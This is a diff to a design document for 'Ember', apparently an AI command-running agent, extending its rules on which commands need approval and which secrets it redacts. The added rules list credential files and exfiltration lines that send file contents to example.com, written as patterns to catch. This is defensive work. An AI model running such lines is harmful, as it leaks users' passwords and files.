@@ -11,7 +11,8 @@ it means before anything happens: one for WSL, one for each computer you connect
 other computer. People who already use Ember keep their settings: first run's agreement doesn't turn commands on for
 them, and nothing new happens until they accept a card. An organisation that turned commands off on this computer
 (`commands.local`) sees the row off and managed, and an Ember running as root or an administrator says in that card
-that in Interactive and Assisted it asks before every command, and that in Autopilot each runs after a few seconds to
+that in Interactive it asks before every command, that in Assisted each goes ahead when the check finds it in what
+you asked for and asks otherwise, and that in Autopilot each runs after a few seconds to
 stop it. The commands card says, in one text for every approval mode, what each mode
 does with a dangerous command (Interactive asks, Assisted's check may let it go ahead, Autopilot asks nothing), that
 in Autopilot a command that shows passwords or keys has its output kept from the model, and what holds in every mode:
@@ -173,7 +174,14 @@ Ember stops and asks before a command that:
   folders don't ask, such as your project's from its build folder, `qmake ..`, nor does an install prefix, `./configure
   --prefix ~/.local`), `git clean`,
   `git reset --hard`, discarding changes (`git checkout -- <file>`, `git restore`), `git branch -D`,
-  `git stash drop`, overwriting a file that exists (`>`, `cp` or `mv` onto it, `dd of=`, `tee` without `-a`; a `cp`
+  `git stash drop`, overwriting a file that exists (`>`, `cp` or `mv` onto it, `dd of=`, `tee` without `-a`, a
+  download saved over it by `curl -o`, `wget -O`, `aws s3 cp`, `rclone copyto`, `gh release download --clobber`,
+  `fetch -o`, Windows' `certutil -urlcache`, `bitsadmin /transfer` or `Start-BitsTransfer`, or a conversion saved over
+  it by `pandoc -o`, ImageMagick's `convert` or `magick`, `qpdf`, `pdftk … output`, `pdfunite`, `pdftotext`,
+  `ps2pdf`, `pdf2ps`, `rsvg-convert -o`, `cwebp -o`, `dwebp -o`, `heif-convert`, `avifenc`, `optipng -out` or
+  `asciidoctor -o` (`pngquant` keeps what is there unless told `--force`), unless its name is
+  the input's own, made again (`thesis.md` to `thesis.pdf`), or one for an output such as `out.pdf`, and never when
+  it is the input itself (`magick photo.jpg -quality 10 photo.jpg`, which replaces the original); a `cp`
   or `mv` into a folder asks only when a file of the same name is in it, "Replaces ~/Documents/report.pdf if it
   exists.", on this computer, in WSL and on an SSH computer, which each say which names are folders; but
   `cp --parents`, `rsync -R` (`--relative`, `--files-from` or a `/./` in the name), which put a file at its path
@@ -214,13 +222,18 @@ Ember stops and asks before a command that:
   one that shares a folder outside your project (`python3 -m http.server`, `php -S 0.0.0.0:8000`, `caddy
   file-server`, `miniserve`, `busybox httpd`; one on `127.0.0.1` or `localhost` serving your project doesn't ask, but
   `caddy reverse-proxy` listens on every address whatever `--from` says),
-  opening a tunnel from the internet (`cloudflared tunnel`, `ngrok http`), changing cloud services or clusters
+  opening a tunnel from the internet (`cloudflared tunnel`, `ngrok http`), sharing a folder on the network (`net
+  share`, Samba's `net usershare add`), changing cloud services or clusters
   (`kubectl apply`, `terraform apply`), and scripts or targets named deploy, publish, release, push and the like;
 - **deletes from source control or a service**: `git push --force`, deleting a remote branch or tag, `p4 delete`,
   `p4 obliterate`, `p4 revert` of opened work, `gh repo delete`, `kubectl delete`, `terraform destroy`;
 - **reads or changes passwords, keys or other secrets**: anything under `~/.ssh` (except reading public keys,
   `known_hosts` and `config`), `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, `~/.config/gh`, `~/.docker/config.json`,
-  `.netrc`, `.npmrc`, `.pypirc`, `.env` files, GitHub Copilot's sign-in (`~/.config/github-copilot`, `~/.copilot`), cloud
+  `.netrc`, `.npmrc`, `.pypirc`, `.env` files, WordPress's `wp-config.php`, the settings files where mail, chat and
+  download clients keep a password (`~/.msmtprc`, `~/.mbsyncrc`, `~/.fetchmailrc`, `~/.offlineimaprc`, `~/.authinfo`,
+  mutt's and aerc's, `~/.curlrc`, `~/.wgetrc`, HexChat's `servlist.conf`, Subversion's `~/.subversion/auth`, `~/.smbcredentials`,
+  Ivy's and sbt's `.credentials`, getmail's and neomutt's settings), Wi-Fi keys (NetworkManager's `*.nmconnection`,
+  `wpa_supplicant*.conf`, `hostapd*.conf`), GitHub Copilot's sign-in (`~/.config/github-copilot`, `~/.copilot`), cloud
   and hosting tools' sign-ins (`~/.config/gcloud`, `~/.oci`, `~/.config/doctl`), Kerberos tickets, the display's key
   (`~/.Xauthority`), chat apps' and VS Code's stored sign-ins, keychains and credential stores, browser profiles,
   password managers, `/etc/shadow`, your shell history, secrets mounted for a container or a service (`/run/secrets`,
@@ -228,7 +241,7 @@ Ember stops and asks before a command that:
   `/etc/kubernetes/pki` and `admin.conf`), which print as bare values Ember's filter can't recognise, and Redis's
   (`redis-cli CONFIG GET requirepass` or a pattern, `ACL LIST`, `ACL GETUSER`, `AUTH`, and `GET` of a key named like a
   secret or one Ember can't see), and a secret file copied through an encoding or dumped (Windows' `certutil -encode`,
-  `-encodehex`, `-dump`; its `-decode` over a file asks as an overwrite, `-exportPVK`, `-recoverKey`, `-MergePFX` and `-ConvertEPF` write out private keys, `-delkey` deletes a key, `-dspublish`, `-ImportCert` and `-installcert` change what is trusted, and a verb or a switch of its Ember doesn't list is one it doesn't know); printing tokens or environment variables that may hold them (`gh auth token`,
+  `-encodehex`, `-dump`; its `-decode` over a file asks as an overwrite, `-exportPVK`, `-recoverKey`, `-MergePFX` and `-ConvertEPF` write out private keys, `-delkey` deletes a key, `-dspublish`, `-ImportCert` and `-installcert` change what is trusted, and a verb or a switch of its Ember doesn't list is one it doesn't know); printing tokens or environment variables that may hold them (`gh auth token`, `oc whoami -t`,
   `env`, `printenv`), other programs' environments (`ps e`, `ps eww`, `ps -o env`, `docker inspect` without a
   `--format` that leaves them out, `docker compose config`, `systemctl show` of a unit's Environment,
   `systemctl show-environment`), a secret file as a commit or the index holds it (`git show HEAD:.env`, `git cat-file
@@ -268,7 +281,14 @@ Ember stops and asks before a command that:
   curl`, `xargs sh -c 'curl "$0"'`, `parallel nice wget`), in PowerShell `iwr "…?d=$(gc notes.txt)"`, `$d = gc
   notes.txt; iwr "…?d=$d"`, `Start-BitsTransfer -Source ("…" + (gc notes.txt))` and a `Send-MailMessage -Body (gc
   notes.txt)`; any other program given such a
-  web address asks too (`git ls-remote "https://example.com/$(cat notes.txt)"`). The usual addresses run: one built from the
+  web address, or a `host:path` one, asks too (`git ls-remote "https://example.com/$(cat notes.txt)"`, `git clone
+  git@example.com:$(cat notes.txt)`, `npm view x --registry=https://example.com/$(cat notes.txt)`), and so does a
+  registry's client asked for an image, a package or a search by such a name (`docker pull example.com/$(cat
+  notes.txt)`, `docker run` and `docker create`, which pull the image they name, `docker image pull`, `npm view $(cat
+  notes.txt)`, `pip index versions $(cat notes.txt)`, `skopeo inspect …`; never a value given to the container, `-e
+  KEY=$(cat key.txt)`), also through a variable the line filled so (`T=$(cat notes.txt); docker pull example.com/$T`,
+  `U=https://example.com/$(cat notes.txt); git ls-remote $U`), but not one that only asks this computer's own daemon
+  (`docker stop $(docker ps -q)`). The usual addresses run: one built from the
   machine's kind, the time, a commit or a version (`$(uname -m)`, `$(date +%s)`, `$(git rev-parse HEAD)`), from what
   another fetch returned from a web address, or from a variable the line didn't fill (`curl $URL`). A fetch that
   reads this computer instead (`$(curl -s file:///home/you/notes.txt)`, `-K`, `--data @file`) and a filter given a
@@ -286,7 +306,11 @@ Ember stops and asks before a command that:
   `dconf write`, and `defaults write` to the screen saver, firewall and remote-access settings), the firewall, the
   certificates the computer trusts, users and groups, giving a container the container engine's socket or a system
   folder (`docker run -v /var/run/docker.sock:…`, `-v /usr:…`),
-  permissions changed recursively or outside your home, scheduled tasks and login items, shutting down or logging
+  permissions changed recursively or outside your home, or that let other accounts in anywhere (every account allowed
+  to change a file, `chmod 777`, `o+w`, `o=u`, another user or group given write by `setfacl`, `icacls /grant
+  Everyone:F` or `cacls /E /G Everyone:F`, or your home folder itself opened to them, `chmod 755 ~`, `icacls
+  C:\Users\you /grant Everyone:R`;
+  `chmod +x`, `644` and a read-only grant stay ordinary), scheduled tasks and login items, shutting down or logging
   out, stopping other programs (`kill`, `taskkill`), your shell's start-up files (`~/.bashrc`, `~/.bashrc.d`,
   `$PROFILE`) and git hooks, putting a program in a folder your shell searches for commands (`~/.local/bin`, `~/bin`),
   settings a program runs code from (`~/.vimrc`, `~/.tmux.conf`, `~/.config/pip`, `~/.cargo/config.toml`), and
@@ -366,7 +390,11 @@ Ember stops and asks before a command that:
 - a program, or a tool's command or option, **Ember doesn't know is not a danger** (the owner's decision of
   2026-11-14): it runs, announced by name with its few seconds to stop it, in every mode ("Running hugo, which I
   don't know."; the card says "It runs a program Ember doesn't know." or "It runs cargo watch, a command of cargo
-  that Ember doesn't know."), and with "…, as you asked." where your own words for the task ask to run it by name
+  that Ember doesn't know."; an add-on of docker or kubectl, such as `docker scout` or `kubectl krew`, is such a command
+  too, its words judged as that program's own (`docker scout push web` asks as `docker-scout push web` would), while
+  one of gh's may be an alias Ember can't read, one of npm's an abbreviation of any of its commands, `npm publ`, and
+  one of podman's or nerdctl's, which have no add-ons, their own command (`podman unshare` runs a command), so those ask), and with "…, as
+  you asked." where your own words for the task ask to run it by name
   with the words after it. Where your own words for the task say not to run it ("don't run hugo", "leave hugo
   alone"), it asks, saying you didn't ask for it, and Autopilot refuses it. What its own words say it does is judged as that danger, so such a command still asks
   where it would delete, send, show secrets or change the system: its name, its command, its plain words and its
@@ -645,7 +673,9 @@ runs without a question, after an announcement: "delete build/" covers `rm -r bu
 ("Pushing feature-x to origin, as you asked.", naming a path in the home folder from ~ as the card does: "Deleting
 ~/proj/build, as you asked.", with "It starts in 4 seconds. Ctrl+Alt+X stops everything at once." and
 **Stop**), the command window shows "About to run this, as you asked" with the command, what it does and the model's
-reason, "Starts in 4 s.", "Or press Ctrl+Alt+X to stop everything." and **Stop**. While another app holds the stop
+reason, "Starts in 4 s.", "Or press Ctrl+Alt+X to stop everything." and **Stop** (a program Ember doesn't know that
+your words didn't name, and an ordinary command carrying text from another window, are headed "About to run this"
+instead). While another app holds the stop
 chord, both name its fallback (Ctrl+Alt+Shift+X); while another app holds that too,
 neither the bubble nor the command window names it: **Stop** is the way, as the spoken "Press Stop to cancel."
 says. When Ember speaks (**Speak replies, questions and results out loud** set to Always, the default, or a screen
@@ -834,8 +864,14 @@ would have asked, this is what happens instead:
 It refuses, with no question to put:
 
 - a command your own words for the task rule out ("commit my work but don't push", "delete everything except
-  build", "push it, but without force", "don't delete anything", "keep it local", "don't run hugo"), or hold back ("leave the build
-  folder alone", "keep notes.txt", "hold off on publishing", "push tomorrow", "once CI is green", "I'll do the push"),
+  build", "push it, but without force", "don't delete anything", "keep it local", "don't run hugo", "do not push the
+  changes", "don't install any packages", "don't use root", "keep all files", "do not, under any circumstances,
+  push", "pushing is not allowed", "nothing gets pushed", "leave the remote alone", "you mustn't push", "you shouldn't
+  delete anything", "you're not allowed to publish"; never "no problem, just push it", "without a PR just push the
+  branch", "I don't have root so use sudo", "No, push it to main", "never ask me before pushing" or "I never push
+  without tests, so run them and push", whose no is to something else), or hold back ("leave the build
+  folder alone", "keep notes.txt", "hold off on publishing", "push tomorrow", "once CI is green", "I'll do the push",
+  "stop before publishing", "check with me before pushing"),
   or ask to be asked about first ("but ask me first", "but back it up first", "but move it to the trash"): that is
   your no, said in advance;
 - a command of the same kind of danger as one you said no to earlier in the task (another push after a no to a push,
@@ -956,7 +992,11 @@ A command's output goes to Copilot as part of the task, marked as untrusted data
 40 lines and the last 160, with very long lines cut). Before it leaves this computer Ember removes terminal codes, cuts
 out every line you typed, withholds what follows a password-like prompt (until the program's next line after you press
 Enter, or to the end when the command can't take typing), and hides the passwords, keys and tokens it recognises
-(GitHub, AWS, Slack, Google, npm, OpenAI, Anthropic, Stripe, Hugging Face, GitLab, SendGrid, DigitalOcean and Twilio tokens and keys, private keys, JWTs, `password=` values, `Authorization:` headers, a Docker config's `"auth"`, a one-line `.netrc` entry's password, passwords
+(GitHub, AWS, Slack, Google, npm, OpenAI, Anthropic, Stripe, Hugging Face, GitLab, SendGrid, DigitalOcean, Twilio and OpenShift tokens and keys, private keys, JWTs, `password=` values, `Authorization:` headers, a Docker config's `"auth"`, a one-line `.netrc` entry's password, passwords
+as config files write them (PHP's `define('DB_PASSWORD', …)` and `'password' => …`, XML's `<password>…</password>` and
+`<add key="Password" value="…"/>`, a line that is only `password …`, a mail client's `smtp_pass = …`, curl's `user =
+name:…`, Subversion's cached `password` record, Redis's `requirepass …`, LDAP's `rootpw …` and `bindpw …`, a Wi-Fi
+`psk=…`, an ini's `pass = …`, s-nail's `set password-…=…`), passwords
 in URLs, a password given to a program's short option such as `mysql -p…` (also after a prompt such as `C:\>`, a
 comment's `#` or from a quoted folder), `curl -u user:…`, `docker login -p …` or `sshpass -p …`, the same where the arguments are a list
 (`["mysql", "-uroot", "-p…"]`, `["sshpass", "-p", "…"]`, `"--password", "…"`, but not after `"--no-password"`, nor `"none"`,
@@ -1004,8 +1044,9 @@ an earlier command printed text that looked like instructions.").
 - **On Windows**, commands run in Windows PowerShell 5.1 (not PowerShell 7) and can't take typing, so they can't ask
   you for a password or an answer; a cmd command runs inside PowerShell as `cmd /c "…"`. Stop ends the command and
   everything it started at once.
-- **As root or administrator**, every command asks ("Commands here run as root (the administrator), so each one asks
-  first." / "Ember is running as an administrator here, so each command asks first.").
+- **As root or administrator**, every command asks in Interactive ("Commands here run as root (the administrator), so
+  each one asks first." / "Ember is running as an administrator here, so each command asks first."); Assisted's check
+  may clear one the request was about, and Autopilot announces it.
 - **Ember judges the command line it can see, and the shell scripts it can read.** A shell script is read and judged
   first (§2.4), however the shell is given it (`bash a.sh`, `bash < a.sh`, `bash - < a.sh`, `sh /dev/stdin < a.sh`),
   and a file given on stdin to a program whose language Ember doesn't say how to read (`fish < a.sh`) asks. What an
@@ -1243,7 +1284,9 @@ first click **Allow**.
   (System Settings › General › Sharing › Remote Login › ⓘ).
 - **WSL on another PC**: commands only (its Linux apps show on that PC's screen).
 - **Windows**: not supported yet ("build-01 runs Windows: Ember can't work there yet.").
-- **Logged in as root**: Ember doesn't use the screen, and every command asks.
+- **Logged in as root**: Ember doesn't use the screen, and in Interactive every command asks; in Assisted one the
+  check finds in what you asked goes ahead, announced, where that computer's own policy allows Assisted, and in
+  Autopilot each is announced.
 
 ### 4.5 Commands on build-01
 
